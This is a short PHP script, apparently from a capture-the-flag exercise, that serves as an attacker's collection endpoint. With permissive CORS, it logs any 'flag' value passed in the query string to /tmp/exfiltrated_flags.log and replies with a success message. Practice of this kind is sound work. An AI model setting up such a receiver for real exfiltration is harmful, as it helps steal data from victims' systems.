<?php
// Endpoint para capturar datos exfiltrados
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$data = $_GET['data'] ?? '';
$flag = $_GET['flag'] ?? '';

if ($flag) {
    // Guardar en archivo log
    $logFile = '/tmp/exfiltrated_flags.log';
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[{$timestamp}] FLAG EXFILTRADA: {$flag}\n";
    file_put_contents($logFile, $entry, FILE_APPEND);
    
    echo json_encode([
        'status' => 'success',
        'message' => '¡FLAG capturada!',
        'flag' => $flag
    ]);
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'No flag received'
    ]);
}
?>
